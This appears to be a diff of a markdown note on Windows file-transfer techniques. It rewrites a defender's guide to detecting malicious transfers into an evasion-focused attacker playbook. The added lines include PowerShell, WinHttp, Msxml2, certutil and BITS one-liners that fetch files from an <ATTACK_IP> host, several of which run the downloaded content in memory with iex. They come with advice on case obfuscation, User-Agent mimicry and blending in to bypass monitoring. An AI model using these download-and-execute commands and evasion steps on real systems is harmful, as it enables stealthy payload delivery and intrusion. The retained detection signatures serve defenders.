@@ -1,77 +1,82 @@
-# Detection of Malicious File Transfers
-
-### Detection Methodology
-
-Defenders use two primary methods to identify malicious file transfers: **command-line detection** and **User-Agent analysis**.
-
-1. **Command-Line Detection**: Blacklisting specific commands is often bypassed through simple **case obfuscation**. A more robust, though time-consuming, method is **whitelisting** all known-good command lines within an environment to alert on any unusual activity.
-2. **User-Agent Analysis**: HTTP clients, including system binaries and scripts, identify themselves via **User-Agent strings**. Organizations feed lists of legitimate user agents (OS processes, update services, antivirus) into a **SIEM** to filter traffic and isolate anomalies that indicate tool-based transfers (e.g., `sqlmap`, `nmap`, `cURL`).
+1. Audit target for command-line logging; if present, apply **case obfuscation** to bypass basic blacklists.
+2. Identify the environment's legitimate traffic profile to select a transfer tool with a matching **User Agent**.
+3. Execute the transfer using the method that blends with existing system processes (e.g., BITS for update-heavy environments or Msxml2 for IE-reliant apps).
 
 ---
 
-### File Transfer Techniques and Signatures
+## PowerShell Native Transfers
 
-#### 1. PowerShell Web Requests
+Standard PowerShell execution permitted and version-specific identification is acceptable.
 
-**Scenario**: Standard method for downloading files or scripts directly into memory or to disk using built-in .NET wrappers.
+Standard file download and save
 
-**Operational Workflow**:
+```
+Invoke-WebRequest http://<ATTACK_IP>/<FILE_PATH> -OutFile "<FILE_PATH>"
+```
 
-1. Execute the request to a remote server.
-2. (Optional) Use `-OutFile` to save the payload to a specific path.
+Alternative cmdlet for file retrieval
 
-|Method|Command|Default User-Agent String|
-|:--|:--|:--|
-|**Invoke-WebRequest**|`Invoke-WebRequest http://<ATTACK_IP>/<FILE> -OutFile "C:\Users\Public\<FILE>"`|`Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0`|
-|**Invoke-RestMethod**|`Invoke-RestMethod http://<ATTACK_IP>/<FILE> -OutFile "C:\Users\Public\<FILE>"`|`Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0`|
+```
+Invoke-RestMethod http://<ATTACK_IP>/<FILE_PATH> -OutFile "<FILE_PATH>"
+```
 
-_Source:_
+- Tool comparison
+    
+    - `Invoke-WebRequest` → `Invoke-WebRequest -OutFile` → Use for general file downloads.
+    - `Invoke-RestMethod` → `Invoke-RestMethod -OutFile` → Use when standard web requests are monitored differently.
+- Gotchas **User Agent analysis** specifically reveals the PowerShell version (e.g., WindowsPowerShell/5.1.14393.0) to defenders.
+    
 
-#### 2. COM Objects (WinHttpRequest / Msxml2)
+## WinHttp COM Object
 
-**Scenario**: Used to bypass basic detection that monitors for standard PowerShell cmdlets by utilizing **Component Object Model (COM)** interfaces.
+Bypassing cmdlet-specific monitoring while utilizing a "compatible" browser User Agent.
 
-**Operational Workflow**:
+Initialize COM object and execute in-memory
 
-1. Instantiate the COM object.
-2. Open a connection to the `<ATTACK_IP>`.
-3. Send the request and execute the response text via `iex`.
+```
+$h=new-object -com WinHttp.WinHttpRequest.5.1; $h.open('GET','http://<ATTACK_IP>/<FILE_PATH>',$false); $h.send(); iex $h.ResponseText
+```
 
-|Tool|Command|Default User-Agent String|
-|:--|:--|:--|
-|**WinHttpRequest**|`$h=new-object -com WinHttp.WinHttpRequest.5.1; $h.open('GET','http://<ATTACK_IP>/<FILE>',$false); $h.send(); iex $h.ResponseText`|`Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)`|
-|**Msxml2.XMLHTTP**|`$h=New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','http://<ATTACK_IP>/<FILE>',$false); $h.send(); iex $h.responseText`|`Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)`|
+- Gotchas **User Agent string** explicitly identifies the use of the WinHttp.WinHttpRequest.5 library.
 
-_Source:_
+## Msxml2 COM Object
 
-#### 3. Certutil
+Mimicking legacy Internet Explorer (MSIE 7.0) traffic to blend with older enterprise software signatures.
 
-**Scenario**: A native Windows binary used for certificate management, frequently abused to download files via the `-urlcache` or `-verifyctl` flags.
+Download and execute via Msxml2
 
-**Operational Workflow**:
+```
+$h=New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','http://<ATTACK_IP>/<FILE_PATH>',$false); $h.send(); iex $h.responseText
+```
 
-1. Use the `-urlcache` flag to pull a file from a remote URL.
-2. Force the download with `-f` and split the output if necessary.
+- Gotchas **Header density** including UA-CPU and Trident versions provides a high-fidelity signature for SIEM alerting.
 
-|Command|Default User-Agent String|
-|:--|:--|
-|`certutil -urlcache -split -f http://<ATTACK_IP>/<FILE>`|`Microsoft-CryptoAPI/10.0`|
-|`certutil -verifyctl -split -f http://<ATTACK_IP>/<FILE>`|`Microsoft-CryptoAPI/10.0`|
+## Certutil Living off the Land
 
-_Source:_
+PowerShell is restricted/monitored and transfers must occur through native Windows binaries.
 
-#### 4. BITS (Background Intelligent Transfer Service)
+Standard certutil download
 
-**Scenario**: Used for asynchronous file transfers. It is often trusted by security products because it is a standard Windows mechanism for updates.
+```
+certutil -urlcache -split -f http://<ATTACK_IP>/<FILE_PATH> <FILE_PATH>
+```
 
-**Operational Workflow**:
+Alternative certutil verb to bypass simple string matching
 
-1. Import the `bitstransfer` module.
-2. Initiate the transfer to a temporary location.
-3. Read the content into a variable, delete the temporary file, and execute the content.
+```
+certutil -verifyctl -split -f http://<ATTACK_IP>/<FILE_PATH> <FILE_PATH>
+```
 
-|Command|Default User-Agent String|
-|:--|:--|
-|`Import-Module bitstransfer; Start-BitsTransfer 'http://<ATTACK_IP>/<FILE>' $env:temp\t; $r=gc $env:temp\t; rm $env:temp\t; iex $r`|`Microsoft BITS/7.8`|
+- Gotchas **Microsoft-CryptoAPI** User Agent is a unique identifier for certutil-based web traffic.
 
-_Source:_
+## BITS Transfer
+
+Mimicking background system administrative tasks or update services.
+
+Import module and execute one-liner transfer
+
+```
+Import-Module bitstransfer; Start-BitsTransfer 'http://<ATTACK_IP>/<FILE_PATH>' <FILE_PATH>; $r=gc <FILE_PATH>; rm <FILE_PATH>; iex $r
+```
+
+- Gotchas **Microsoft BITS** User Agent and the use of HEAD requests instead of GET are immediate anomalies in non-update traffic.
